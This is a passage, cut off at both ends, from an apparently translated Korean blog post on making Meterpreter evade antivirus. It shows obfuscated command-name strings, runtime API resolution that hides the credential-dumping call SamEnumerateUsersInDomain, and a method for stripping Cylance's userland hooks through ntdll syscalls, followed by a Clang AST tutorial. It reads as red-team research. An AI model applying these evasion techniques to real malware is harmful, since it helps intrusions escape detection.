class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span><span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span><span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span><span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;g&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;q&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;y&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_PHxnGM7M0609[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;q&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;y&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;g&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;q&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;y&apos;</span>,<span class="hljs-number">0</span>};Command customCommands[] ={    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR};</code></pre><h2 id="API-Import-&#xC228;&#xAE30;&#xAE30;"><a href="#API-Import-&#xC228;&#xAE30;&#xAE30;" class="headerlink" title="API Import &#xC228;&#xAE30;&#xAE30;"></a>API Import &#xC228;&#xAE30;&#xAE30;</h2><p>&#xC678;&#xBD80; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; export &#xB41C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; linker&#xAC00; <em>Import Address Table</em>(IAT)&#xC5D0; &#xAE30;&#xB85D;&#xD55C;&#xB2E4;. &#xD568;&#xC218; &#xC774;&#xB984;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; &#xD568;&#xC218;&#xBA85;&#xB4E4;&#xC744; &#xC228;&#xAE30;&#xACE0; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xB4E4;&#xC740; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xB2E4;.</p><p>Meterpreter&#xC758; <em>kiwi</em> extension&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; <code>samlib.dll</code>&#xC5D0;&#xC11C; export &#xB418;&#xBBC0;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xB294; <code>samlib.dll</code>&#xACFC; <code>SamEnumberateUsersInDomain</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xD45C;&#xC2DC;&#xB41C;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC2E4;&#xD589; &#xC911;&#xC5D0; <code>LoadLibrary/GetProcAddress</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; API&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xC798;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC7AC;&#xC791;&#xC131;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = {<span class="hljs-string">&apos;S&apos;</span>,<span class="hljs-string">&apos;A&apos;</span>,<span class="hljs-string">&apos;M&apos;</span>,<span class="hljs-string">&apos;L&apos;</span>,<span class="hljs-string">&apos;I&apos;</span>,<span class="hljs-string">&apos;B&apos;</span>,<span class="hljs-string">&apos;.&apos;</span>,<span class="hljs-string">&apos;D&apos;</span>,<span class="hljs-string">&apos;L&apos;</span>,<span class="hljs-string">&apos;L&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = {<span class="hljs-string">&apos;S&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;E&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;U&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;I&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;D&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-number">0</span>};HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-&#xC7AC;&#xC791;&#xC131;"><a href="#syscall-&#xC7AC;&#xC791;&#xC131;" class="headerlink" title="syscall &#xC7AC;&#xC791;&#xC131;"></a>syscall &#xC7AC;&#xC791;&#xC131;</h2><p>Cylance&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; Meterpreter&#xC758; <em>migrate</em>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xD0D0;&#xC9C0;&#xAC00; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. Cylance&#xB294; userland hook&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC778;&#xC81D;&#xC158;&#xC744; &#xD0D0;&#xC9C0;&#xD55C;&#xB2E4;. &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB824;&#xBA74; hook&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAC04;&#xB2E8;&#xD788; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;. ntdll&#xC744; &#xC77D;&#xC740; &#xD6C4; syscall &#xBC88;&#xD638;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; ready-to-call shellcode&#xC5D0; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xAC83;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xACE0; userland hook&#xC744; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xD55C;&#xB2E4;. &#xD544;&#xC790;&#xB294; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; NTDLL.DLL&#xC744; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xB85C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCF4;&#xC9C0; &#xBABB;&#xD588;&#xB2E4;.</p><h1 id="&#xAD6C;&#xD604;"><a href="#&#xAD6C;&#xD604;" class="headerlink" title="&#xAD6C;&#xD604;"></a>&#xAD6C;&#xD604;</h1><p>&#xC55E;&#xC11C; &#xB9D0;&#xD55C; &#xBAA8;&#xB4E0; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB4E4;&#xC740; <em>libTooling</em>&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; source code refactoring tool&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; <em>libTooling</em> &#xBB38;&#xC11C;&#xAC00; &#xBD80;&#xC871;&#xD574;&#xC11C; &#xD544;&#xC790;&#xC758; &#xD300;&#xC5D0;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xD55C; &#xAC83;&#xC744; &#xBB38;&#xC11C;&#xD654;&#xD588;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC1C;&#xC120;&#xC758; &#xC5EC;&#xC9C0;&#xAC00; &#xC788;&#xC73C;&#xBA70; &#xBB34;&#xC5B8;&#xAC00; &#xB208;&#xC5D0; &#xB744;&#xB294; &#xACBD;&#xC6B0; &#xD544;&#xC790;&#xB294; &#xADF8;&#xAC83;&#xC5D0; &#xB300;&#xD574; &#xB4E3;&#xACE0; &#xC2F6;&#xB2E4;.</p><h2 id="&#xCD94;&#xC0C1;-&#xAD6C;&#xBB38;-&#xD2B8;&#xB9AC;-101"><a href="#&#xCD94;&#xC0C1;-&#xAD6C;&#xBB38;-&#xD2B8;&#xB9AC;-101" class="headerlink" title="&#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC; 101"></a>&#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC; 101</h2><p>&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xBCF4;&#xD1B5; &#xC5EC;&#xB7EC; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xB294;&#xB370; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <em>Parser</em>&#xC640; <em>Lexer</em>&#xB85C; &#xAD6C;&#xC131;&#xB41C;&#xB2E4;. &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xAC00; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xBA3C;&#xC800; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBA38;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xC6D0;&#xBCF8; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; Parse Tree&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xD544;&#xC694;&#xB85C; &#xD558;&#xB294; &#xB178;&#xB4DC;&#xC5D0; semantic information&#xC744; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;. &#xC774; &#xACB0;&#xACFC;&#xB97C; <em>Abstract Syntax Tree</em>(&#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;)&#xB77C;&#xACE0; &#xBD80;&#xB978;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; &#xC704;&#xD0A4;&#xD53C;&#xB514;&#xC544;&#xC758; &#xC608;&#xC2DC;&#xC774;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b &#x2260; <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a &#x2212; b  <span class="hljs-keyword">else</span>    b := b &#x2212; a<span class="hljs-keyword">return</span> a</code></pre><p>&#xAC04;&#xB2E8;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC77C;&#xBC18;&#xC801;&#xC778; AST&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png" alt></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">&#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC; &#xC608;&#xC2DC;</a></p><p>&#xC774; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; property&#xB97C; &#xC774;&#xD574;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC791;&#xC131;&#xD560; &#xB54C; &#xC815;&#xBC00;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBBC0;&#xB85C; &#xB300;&#xADDC;&#xBAA8; &#xCF54;&#xB4DC; refactoring&#xC5D0; &#xC801;&#xD569;&#xD558;&#xB2E4;.</p><h3 id="Clang&#x2019;s-Abstract-Syntax-Tree"><a href="#Clang&#x2019;s-Abstract-Syntax-Tree" class="headerlink" title="Clang&#x2019;s Abstract Syntax Tree"></a>Clang&#x2019;s Abstract Syntax Tree</h3><p>The Right Way&#xC758; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xBCC0;&#xACBD;&#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; Clang&#xC758; AST&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xC57C; &#xD55C;&#xB2E4;. Clagn&#xC740; AST &#xB364;&#xD504;&#xB97C; command-line switch&#xC5D0; &#xC608;&#xC058;&#xAC8C; &#xD45C;&#xC2DC;&#xD558;&#xC9C0;&#xB9CC; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xD50C;&#xB798;&#xADF8; &#xC124;&#xC815;&#xC774; &#xAE4C;&#xB2E4;&#xB86D;&#xB2E4;.</p><p>&#xAC04;&#xB2E8;&#xD55C; &#xD14C;&#xC2A4;&#xD2B8; translation unit&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> (!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    {        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xB2E4;&#xC74C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; <code>.sh</code> &#xD30C;&#xC77C;&#xC5D0; &#xC791;&#xC131;&#xD574;&#xB77C;</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span 